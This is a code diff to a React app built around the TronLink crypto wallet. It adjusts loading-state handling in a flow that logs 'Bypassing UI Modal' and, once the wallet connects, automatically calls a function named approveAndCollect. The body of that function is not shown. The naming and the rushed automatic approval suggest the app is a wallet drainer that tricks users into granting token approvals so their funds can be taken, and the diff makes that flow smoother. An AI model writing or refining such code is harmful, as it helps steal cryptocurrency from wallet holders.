@@ -233,7 +233,6 @@ export default function App() {
     }
     setAmountError('');
 
-    // 🛠️ SMART BYPASS WITH IMMEDIATE RESOLUTION
     const activeTwInstance = resolveTronWeb();
     const currentAddress = walletAddress || activeTwInstance?.defaultAddress?.base58;
 
@@ -243,15 +242,21 @@ export default function App() {
       const w = window as any;
       if (w.tronLink && typeof w.tronLink.request === 'function') {
           log("[SYSTEM] DApp Browser Detected. Bypassing UI Modal...");
+          
+          // 🛠️ FIX 1: Instantly trigger loading state BEFORE waiting for the wallet popup
+          setLoading(true); 
+          
           try {
               await w.tronLink.request({ method: 'tron_requestAccounts' });
               log("[SYSTEM] Wallet connected directly!");
-              // 🛠️ Force the execution loop to start immediately, ignoring AppKit's delay
               setTimeout(() => approveAndCollect(), 500);
               return; 
           } catch (err) {
               log("⚠️ User rejected direct connection.");
               manualConnect.current = false; 
+              
+              // 🛠️ FIX 2: Revert the button back to "Next" if they click Cancel in the wallet
+              setLoading(false); 
               return;
           }
       }
